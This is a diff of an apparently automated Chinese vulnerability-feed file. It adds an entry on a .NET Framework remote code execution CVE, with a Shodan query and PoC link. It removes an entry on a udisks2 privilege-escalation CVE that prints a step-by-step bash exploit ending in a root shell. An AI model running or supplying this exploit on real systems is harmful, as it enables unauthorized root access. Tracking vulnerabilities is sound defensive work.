@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-20T23:15:12.570Z</updated>
+  <updated>2025-06-21T00:00:14.717Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Microsoft NET Framework 远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/21/github_1408488851/"/>
+    <id>http://example.com/2025/06/21/github_1408488851/</id>
+    <published>2025-06-21T00:00:14.721Z</published>
+    <updated>2025-06-21T00:00:14.717Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Microsoft .NET Framework 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-0646</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Microsoft .NET Framework 存在一个远程代码执行漏洞，原因是输入验证不当，允许远程攻击者执行任意代码。利用此漏洞需要向系统发送恶意输入。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> .NET Framework</p><p><strong>搜索语法：</strong> server: ms .net remoting</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12210">https://github.com/projectdiscovery/nuclei-templates/issues/12210</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Microsoft .NET Framework contains a remote code execution caused by improper input validation, letting remote attackers execute arbitrary code, exploit requires sending malicious input to the system.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="http://packetstormsecurity.com/files/156930/SharePoint-Workflows-XOML-Injection.html">http://packetstormsecurity.com/files/156930/SharePoint-Workflows-XOML-Injection.html</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-server-ms-net-remoting"><a href="#Shodan-Query-server-ms-net-remoting" class="headerlink" title="Shodan Query: server: ms .net remoting"></a>Shodan Query: <code>server: ms .net remoting</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Microsoft .NET Framework 远程代码执行漏洞&lt;/p&gt;
+&lt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
   
   <entry>
     <title>Achat 0150 beta7 Buffer Overflow Vulnerability</title>
@@ -523,33 +550,6 @@
     <category term="权限绕过" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
     
     <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>udisks2 权限提升漏洞</title>
-    <link href="http://example.com/2025/06/20/github_347207945/"/>
-    <id>http://example.com/2025/06/20/github_347207945/</id>
-    <published>2025-06-20T11:15:23.976Z</published>
-    <updated>2025-06-20T11:15:23.976Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> udisks2 权限提升漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-6019</li></ul><p><strong>漏洞类型：</strong> 权限提升</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该漏洞存在于Linux系统中的<code>udisks2</code>服务中，通过利用文件系统调整大小时的竞争条件，攻击者可以在世界可写的临时目录中访问SUID二进制文件，从而实现本地权限提升。关键组件包括<code>udisks2</code>服务（DBus接口）、<code>org.freedesktop.UDisks2.Filesystem.Resize</code>方法以及<code>/tmp/blockdev*</code>下的临时挂载点。</p><p><strong>产品厂商：</strong> Linux</p><p><strong>产品名称：</strong> udisks2</p><p><strong>来源：</strong> <a href="https://github.com/And-oss/CVE-2025-6019-exploit">https://github.com/And-oss/CVE-2025-6019-exploit</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>exploit.sh</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-6019-Privilege-Escalation-Exploit-via-UDisks2-Filesystem-Resize"><a href="#CVE-2025-6019-Privilege-Escalation-Exploit-via-UDisks2-Filesystem-Resize" class="headerlink" title="CVE-2025-6019: Privilege Escalation Exploit via UDisks2 Filesystem Resize"></a>CVE-2025-6019: Privilege Escalation Exploit via UDisks2 Filesystem Resize</h2><h3 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h3><ul><li><strong>CVE ID</strong>: CVE-2025-6019</li><li><strong>Impact</strong>: Local Privilege Escalation (LPE)</li><li><strong>Affected Systems</strong>: Linux systems with vulnerable <code>udisks2</code> versions</li><li><strong>Mechanism</strong>: Race condition during filesystem resize allows access to SUID binaries in world-writable temporary directories</li><li><strong>Key Components</strong>: <ul><li><code>udisks2</code> service (DBus interface)</li><li><code>org.freedesktop.UDisks2.Filesystem.Resize</code> method</li><li>Temporary mount points under <code>/tmp/blockdev*</code></li></ul></li></ul><h3 id="Exploit-Workflow"><a href="#Exploit-Workflow" class="headerlink" title="Exploit Workflow"></a>Exploit Workflow</h3><h4 id="1-Prepare-Malicious-Filesystem-Image-Attacker"><a href="#1-Prepare-Malicious-Filesystem-Image-Attacker" class="headerlink" title="1. Prepare Malicious Filesystem Image (Attacker)"></a>1. Prepare Malicious Filesystem Image (Attacker)</h4><pre><code class="language-bash">dd if=/dev/zero of=./xfs.image bs=1M count=300mkfs.xfs ./xfs.imagemkdir ./xfs.mountmount -t xfs ./xfs.image ./xfs.mountcp /bin/bash ./xfs.mountchmod 04555 ./xfs.mount/bash  # Set SUID bitumount ./xfs.mount``` ## Verify system capabilitiesgdbus call --system --dest org.freedesktop.login1 \  --object-path /org/freedesktop/login1 \  --method org.freedesktop.login1.Manager.CanReboot## Clear interferencekillall -KILL gvfs-udisks2-volume-monitor## Setup loop deviceudisksctl loop-setup --file ./xfs.image --no-user-interaction## Background watcher (executes when SUID binary appears)while true; do   /tmp/blockdev*/bash -c &#39;sleep 10; ls -l /tmp/blockdev*/bash&#39; &amp;&amp; breakdone 2&gt;/dev/null &amp;## Trigger vulnerability via DBusgdbus call --system --dest org.freedesktop.UDisks2 \  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \  --method org.freedesktop.UDisks2.Filesystem.Resize 0 &#39;&#123;&#125;&#39;/tmp/blockdev*/bash -p  # Launch privileged shellid## uid=65534(nobody) gid=65534(nobody) euid=0(root)```</code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; udisks2 权限提升漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/st</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-    <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
     
   </entry>
   
